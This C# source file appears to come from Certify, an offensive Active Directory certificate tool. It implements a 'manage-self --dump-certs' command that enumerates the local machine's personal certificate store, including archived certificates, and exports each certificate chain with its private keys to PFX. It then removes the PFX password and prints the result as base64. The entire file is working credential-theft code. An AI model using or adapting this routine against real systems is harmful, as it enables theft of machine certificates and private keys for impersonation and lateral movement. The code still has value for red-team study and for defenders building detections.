using Certify.Lib;
using CommandLine;
using System;
using System.Runtime.InteropServices;

#if !DISARMED

namespace Certify.Commands
{
    internal class ManageSelf
    {
        [Verb("manage-self", HelpText = "Manage the current machine")]
        public class Options : DefaultOptions
        {
            [Option("dump-certs", Group = "Action", HelpText = "Dump all certificates in the current machine store")]
            public bool DumpCertificates { get; set; }
        }

        public static int Execute(Options opts)
        {
            Console.WriteLine("[*] Action: Manage the current machine");

            PerformCertificateDump(opts);

            return 0;
        }

        [StructLayout(LayoutKind.Explicit)]
        struct CERT_CHAIN_PARA
        {
            [FieldOffset(0)]
            public uint cbSize;
            [FieldOffset(8)]
            public uint RequestedUsage_dwType;
            [FieldOffset(16)]
            public uint RequestedUsage_Usage_cUsageIdentifier;
            [FieldOffset(24)]
            public IntPtr RequestedUsage_Usage_rgpszUsageIdentifier;
            [FieldOffset(32)]
            public uint RequestedIssuancePolicy_dwType;
            [FieldOffset(40)]
            public uint RequestedIssuancePolicy_Usage_cUsageIdentifier;
            [FieldOffset(48)]
            public IntPtr RequestedIssuancePolicy_Usage_rgpszUsageIdentifier;
            [FieldOffset(56)]
            public uint dwUrlRetrievalTimeout;
            [FieldOffset(60)]
            public int fCheckRevocationFreshnessTime;
            [FieldOffset(64)]
            public uint dwRevocationFreshnessTime;
            [FieldOffset(72)]
            public IntPtr pftCacheResync;
            [FieldOffset(80)]
            public IntPtr pStrongSignPara;
            [FieldOffset(88)]
            public uint dwStrongSignFlags;
        }

        [StructLayout(LayoutKind.Explicit)]
        struct CERT_CHAIN_CONTEXT
        {
            [FieldOffset(0)]
            public uint cbSize;
            [FieldOffset(4)]
            public uint TrustStatus_dwErrorStatus;
            [FieldOffset(8)]
            public uint TrustStatus_dwInfoStatus;
            [FieldOffset(12)]
            public uint cChain;
            [FieldOffset(16)]
            public IntPtr rgpChain;
            [FieldOffset(24)]
            public uint cLowerQualityChainContext;
            [FieldOffset(32)]
            public IntPtr rgpLowerQualityChainContext;
            [FieldOffset(40)]
            [MarshalAs(UnmanagedType.Bool)] public bool fHasRevocationFreshnessTime;
            [FieldOffset(44)]
            public uint dwRevocationFreshnessTime;
            [FieldOffset(48)]
            public uint dwCreateFlags;
            [FieldOffset(52)]
            public uint ChainId_Data1;
            [FieldOffset(56)]
            public ushort ChainId_Data2;
            [FieldOffset(58)]
            public ushort ChainId_Data3;
            [FieldOffset(60)]
            public ulong ChainId_Data4;
        };

        [StructLayout(LayoutKind.Explicit)]
        struct CERT_SIMPLE_CHAIN
        {
            [FieldOffset(0)]
            public uint cbSize;
            [FieldOffset(4)]
            public uint TrustStatus_dwErrorStatus;
            [FieldOffset(8)]
            public uint TrustStatus_dwInfoStatus;
            [FieldOffset(12)]
            public uint cElement;
            [FieldOffset(16)]
            public IntPtr rgpElement;
            [FieldOffset(24)]
            public IntPtr pTrustListInfo;
            [FieldOffset(32)]
            [MarshalAs(UnmanagedType.Bool)] public bool fHasRevocationFreshnessTime;
            [FieldOffset(36)]
            public uint dwRevocationFreshnessTime;
        }

        [StructLayout(LayoutKind.Explicit)]
        struct CERT_CHAIN_ELEMENT
        {
            [FieldOffset(0)]
            public uint cbSize;
            [FieldOffset(8)]
            public IntPtr pCertContext;
            [FieldOffset(16)]
            public uint TrustStatus_dwErrorStatus;
            [FieldOffset(20)]
            public uint TrustStatus_dwInfoStatus;
            [FieldOffset(24)]
            public IntPtr pRevocationInfo;
            [FieldOffset(32)]
            public IntPtr pIssuanceUsage;
            [FieldOffset(40)]
            public IntPtr pApplicationUsage;
            [FieldOffset(48)]
            [MarshalAs(UnmanagedType.LPWStr)] public string pwszExtendedErrorInfo;
        }

        [StructLayout(LayoutKind.Explicit)]
        struct CERT_CONTEXT
        {
            [FieldOffset(0)]
            public uint dwCertEncodingType;
            [FieldOffset(8)]
            public IntPtr pbCertEncoded;
            [FieldOffset(16)]
            public uint cbCertEncoded;
            [FieldOffset(24)]
            public IntPtr pCertInfo;
            [FieldOffset(32)]
            public IntPtr hCertStore;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct CRYPT_DATA_BLOB
        {
            public uint cbData;
            public IntPtr pbData;
        }

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CertOpenStore(IntPtr lpszStoreProvider, uint dwEncodingType, IntPtr hCryptProv, uint dwFlags, string pvPara);

        [DllImport("crypt32.dll")]
        static extern bool CertCloseStore(IntPtr hCertStore, uint dwFlags);

        [DllImport("crypt32.dll")]
        static extern IntPtr CertEnumCertificatesInStore(IntPtr hCertStore, IntPtr pPrevCertContext);

        [DllImport("crypt32.dll")]
        static extern bool CertFreeCertificateContext(IntPtr pCertContext);

        [DllImport("crypt32.dll")]
        static extern bool CertGetCertificateChain(IntPtr hChainEngine, IntPtr pCertContext, IntPtr pTime, IntPtr hAdditionalStore, ref CERT_CHAIN_PARA pChainPara, uint dwFlags, IntPtr pvReserved, out IntPtr ppChainContext);

        [DllImport("crypt32.dll")]
        static extern void CertFreeCertificateChain(IntPtr pChainContext);

        [DllImport("crypt32.dll")]
        static extern bool CertAddCertificateContextToStore(IntPtr hCertStore, IntPtr pCertContext, uint dwAddDisposition, out IntPtr ppStoreContext);

        [DllImport("crypt32.dll")]
        static extern bool CertAddEncodedCertificateToStore(IntPtr hCertStore, uint dwCertEncodingType, IntPtr pbCertEncoded, uint cbCertEncoded, uint dwAddDisposition, out IntPtr ppCertContext);

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool PFXExportCertStoreEx(IntPtr hStore, ref CRYPT_DATA_BLOB pPFX, string szPassword, IntPtr pvPara, uint dwFlags);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalAlloc(uint uFlags, uint uBytes);

        [DllImport("kernel32.dll")]
        static extern IntPtr LocalFree(IntPtr hMem);

        private static void PerformCertificateDump(Options opts)
        {
            if (opts.DumpCertificates)
            {
                var dwEncodingType = 1u; // X509_ASN_ENCODING
                var dwCertFlags = 0x2c200u; // CERT_SYSTEM_STORE_LOCAL_MACHINE | CERT_STORE_READONLY_FLAG | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_ENUM_ARCHIVED_FLAG
                var hCertStore = CertOpenStore(new IntPtr(10 /* CERT_STORE_PROV_SYSTEM_W */), dwEncodingType, IntPtr.Zero, dwCertFlags, $"MY");

                if (hCertStore != IntPtr.Zero)
                {
                    var ctx = IntPtr.Zero;

                    while ((ctx = CertEnumCertificatesInStore(hCertStore, ctx)) != IntPtr.Zero)
                    {
                        Console.WriteLine();
                        Console.WriteLine("[*] Attempting to dump a certificate from the certificate store.");

                        var dwTempFlags = 0x200u; // CERT_STORE_ENUM_ARCHIVED_FLAG
                        var hTempStore = CertOpenStore(new IntPtr(2 /* CERT_STORE_PROV_MEMORY */), dwEncodingType, IntPtr.Zero, dwTempFlags, null);

                        if (hTempStore != null)
                        {
                            var chain_para = new CERT_CHAIN_PARA()
                            {
                                cbSize = (uint)Marshal.SizeOf<CERT_CHAIN_PARA>()
                            };

                            if (CertGetCertificateChain(new IntPtr(1 /* HCCE_LOCAL_MACHINE */), ctx, IntPtr.Zero, IntPtr.Zero, ref chain_para, 0, IntPtr.Zero, out IntPtr pChainContext))
                            {
                                var chain_ctx = Marshal.PtrToStructure<CERT_CHAIN_CONTEXT>(pChainContext);

                                if (chain_ctx.cChain != 0)
                                {
                                    var chain_ptr = Marshal.ReadIntPtr(chain_ctx.rgpChain);
                                    var chain = Marshal.PtrToStructure<CERT_SIMPLE_CHAIN>(chain_ptr);

                                    for (int i = 0; i < chain.cElement; i++)
                                    {
                                        var element_off = Marshal.SizeOf<IntPtr>() * i;
                                        var element_ptr = Marshal.ReadIntPtr(chain.rgpElement + element_off);
                                        var element = Marshal.PtrToStructure<CERT_CHAIN_ELEMENT>(element_ptr);

                                        uint dwAddDisposition = 3u; // CERT_STORE_ADD_REPLACE_EXISTING;

                                        if (i == 0)
                                        {
                                            if (CertAddCertificateContextToStore(hTempStore, element.pCertContext, dwAddDisposition, out IntPtr pStoreContext) && pStoreContext != IntPtr.Zero)
                                                CertFreeCertificateContext(pStoreContext);
                                        }
                                        else
                                        {
                                            var cert_ctx = Marshal.PtrToStructure<CERT_CONTEXT>(element.pCertContext);

                                            if (CertAddEncodedCertificateToStore(hTempStore, dwEncodingType, cert_ctx.pbCertEncoded, cert_ctx.cbCertEncoded, dwAddDisposition, out IntPtr pCertContext))
                                                CertFreeCertificateContext(pCertContext);
                                        }
                                    }
                                }

                                CertFreeCertificateChain(pChainContext);
                            }

                            var data_blob = new CRYPT_DATA_BLOB()
                            {
                                cbData = 0
                            };

                            uint dwExportFlags = 6u; // EXPORT_PRIVATE_KEYS | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY;

                            if (!PFXExportCertStoreEx(hTempStore, ref data_blob, "dump", IntPtr.Zero, dwExportFlags))
                                Console.WriteLine("[X] Failed to export the constructed certificate to pfx.");
                            else
                            {
                                if ((data_blob.pbData = LocalAlloc(0x0040 /* LPTR */, data_blob.cbData)) != IntPtr.Zero)
                                {
                                    if (PFXExportCertStoreEx(hTempStore, ref data_blob, "dump", IntPtr.Zero, dwExportFlags))
                                    {
                                        var bytes = new byte[data_blob.cbData];
                                        Marshal.Copy(data_blob.pbData, bytes, 0, (int)data_blob.cbData);

                                        var cert_id = CertTransformUtil.GetPfxIdentifier(bytes, "dump");
                                        var cert_pfx = CertTransformUtil.RemovePfxPassword(bytes, "dump");

                                        Console.WriteLine($"[*] Certificate (PFX) - {cert_id}:");
                                        Console.WriteLine();
                                        Console.WriteLine(Convert.ToBase64String(cert_pfx));
                                    }

                                    LocalFree(data_blob.pbData);
                                }
                            }

                            CertCloseStore(hTempStore, 0x00000002 /* CERT_CLOSE_STORE_CHECK_FLAG */);
                        }
                    }

                    if (ctx != IntPtr.Zero)
                        CertFreeCertificateContext(ctx);

                    CertCloseStore(hCertStore, 0x00000002 /* CERT_CLOSE_STORE_CHECK_FLAG */);
                }
            }
        }
    }
}

#endif